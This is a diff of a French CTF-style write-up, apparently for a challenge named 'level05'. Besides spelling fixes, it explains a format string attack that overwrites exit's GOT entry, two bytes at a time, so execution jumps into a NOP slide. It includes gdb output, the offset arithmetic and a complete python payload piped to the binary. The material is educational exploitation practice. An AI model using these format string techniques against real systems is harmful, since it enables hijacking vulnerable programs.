@@ -52,9 +52,9 @@ End of assembler dump.
 
 ```
 
-> addresse dans la nop slide : 0xffffd887
-> addresse du exit :  0x80497e0
-> addresse du exit + 2 :  0x80497e2
+> adresse dans la nop slide : 0xffffd887
+> adresse du exit :  0x80497e0
+> adresse du exit + 2 :  0x80497e2
 
 Maintenant on va chercher l'offset de notre printf :
 
@@ -63,8 +63,21 @@ Maintenant on va chercher l'offset de notre printf :
 bbbb|00000064 |f7fcfac0 |f7ec3af9 |ffffd6df |ffffd6de |00000000 |ffffffff |ffffd764 |f7fdb000 |62626262 |3830257c |257c2078 |20783830 |3830257c |257c2078
 ```
 
-Notre offset apparait au niveau de nos `b` (62 en valeur hexadecimale), au 10 ème octet dans notre **stack**. On sait donc que notre première argument lu par **printf** sera à cette addresse.
-On va chercher à ecrire la valeur décimale de notre nop slide au niveau de l'addresse du exit. Pour ça, on va employer la méthode du **format string attack**, **2 bytes by 2 bytes**, Donc écrire les 2 premiers bytes de l'addresse de notre  **nop slide** puis les deux suivants car il serait trop lent d'insérer  la totalité en une fois, cela nous ferais une taille de champ trop grande (+ de 4 milliard !).
+Notre offset apparait au niveau de nos `b` (62 en valeur hexadecimale), au 10 ème octet dans notre **stack**. On sait donc que notre première argument lu par **printf** sera à cette adresse.
+On va chercher à ecrire la valeur décimale de notre nop slide au niveau de l'adresse du exit. Pour ça, on va employer la méthode du **format string attack**, **2 bytes by 2 bytes**, Donc écrire les 2 premiers bytes de l'adresse de notre  **nop slide** puis les deux suivants car il serait trop lent d'insérer  la totalité en une fois, cela nous ferais une taille de champ trop grande (+ de 4 milliard !).
+
+On prend donc notre adresse dans la nop slide et on la coupe en deux:
+`ffff` et `d887`. On affiche leurs valeurs en décimal:
+
+```gdb
+(gdb) > p 0xffff
+$3 = 65535
+(gdb) > p 0xd887
+$4 = 55431
+```
+
+On doit soustraire la taille de champ écrite par notre premier argument à notre deuxième: `65535 - 55431 = 10104`
+On formate par la suite notre **format string attack** avec nos 4 bytes séparés en deux:
 
 ```bash
 (python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55423c' + '%10\$hn'+ '%10104c' + '%11\$hn'"; cat) | ./level05
